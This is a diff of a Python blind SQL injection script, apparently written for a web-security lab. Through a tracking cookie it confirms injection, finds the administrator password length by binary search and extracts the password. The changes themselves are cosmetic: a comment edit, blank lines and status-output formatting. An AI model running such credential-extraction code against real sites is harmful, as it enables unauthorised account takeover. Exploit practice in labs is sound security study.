@@ -62,7 +62,7 @@ def confirm_injection():
   print("(+) username column and username:administrator found.")
 
 def get_password_length():
-  # Retreive password length using binary search to reduce the number of requests made
+  # Retreive the password length using binary search to reduce the number of requests made
   pass_length = [x for x in range(1,100)]
   lb = 0
   ub = len(pass_length)
@@ -78,6 +78,7 @@ def get_password_length():
 
     else:
       ub = mid-1
+
   print('(-) Can not determine password length!')
   sys.exit(-1)
 
@@ -91,7 +92,7 @@ def enumerate_admin_password(password_length):
   total_combinations = password_length*len(ascii_positions)
   print(f'(+) Starting password enumeration.... \nTotal requests: {total_combinations}')
 
-  sys.stdout.write('\r[] Current Extraction Status: ')
+  sys.stdout.write('\r[+] Current Extraction Status: ')
   sys.stdout.flush()
 
   req_count = 0
@@ -115,7 +116,7 @@ def enumerate_admin_password(password_length):
       else: 
         ub = mid_index-1
 
-    sys.stdout.write('\r[] Current Extraction Status: ' + password)
+    sys.stdout.write('\r[+] Current Extraction Status: ' + password)
     sys.stdout.flush()
 
     if (len(password) == password_length):
@@ -137,6 +138,7 @@ if __name__ == '__main__':
   with requests.Session() as client:
     client.verify = False
     client.proxies = proxies
+    
     get_tracking_cookie()
     confirm_injection()
 
